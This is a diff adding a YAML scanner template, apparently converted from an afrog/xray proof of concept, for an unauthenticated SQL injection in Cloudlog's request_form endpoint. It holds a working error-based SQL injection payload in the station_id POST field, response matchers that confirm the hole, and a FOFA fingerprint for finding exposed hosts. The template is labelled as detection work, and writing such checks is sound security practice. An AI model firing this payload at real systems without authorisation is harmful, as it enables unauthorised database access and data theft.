@@ -1,0 +1,30 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: station_id=1 AND (SELECT 2469 FROM(SELECT COUNT(*),CONCAT(0x7162716b71,(SELECT (ELT(2469=2469,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - qbqkq1qbqkq1
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/index.php/oqrs/request_form'
+id: cloudlog-request-form-sqli
+info:
+  author: ZacharyZcR
+  description: |-
+    Cloudlog system has an unauthenticated SQL injection vulnerability in the request_form interface.
+    Attackers can exploit this vulnerability to extract information from the database.
+    fofa: icon_hash="-460032467"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Cloudlog Request_form SQL Injection
+  severity: high
+  tags: cloudlog,sqli,argus-import
